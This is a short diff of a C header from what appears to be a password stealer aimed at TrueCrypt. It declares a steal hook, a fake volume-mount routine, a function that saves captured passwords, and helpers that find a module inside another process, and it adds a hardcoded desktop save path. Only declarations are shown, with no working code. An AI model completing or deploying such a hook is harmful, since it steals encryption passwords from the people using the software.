@@ -1,5 +1,7 @@
 #pragma once
 
+#define PATH_TO_DESKTOP "C:\\Users\\Sony\\Desktop\\"
+
 typedef struct
 {
 	unsigned __int32 Length;
@@ -28,7 +30,7 @@ int FakeMountVolume(HWND hwndDlg, int driveNo, char *volumePath, Password *passw
 BOOL TrueCryptStealHook();
 
 void SaveStealPassword(LPSTR volumePath, PBYTE password, UINT passwordLen);
-void GetFilePathToSaveStealPassword(LPSTR rootPath, LPSTR volumePath, LPSTR fileToSave);
+void GetFilePathFromDirectoryNameAndFileName(LPSTR rootPath, LPSTR volumePath, LPSTR fileToSave);
 
 BOOL GetBaseAddressAndSizeModuleInProcess(HANDLE hProc, LPVOID &base, DWORD &size, LPWCH trueModuleName, int trueModuleNameSize);
 BOOL FullModuleNameIsTrueModuleName(LPWCH moduleName, LPWCH trueModuleName, int trueModuleNameSize);
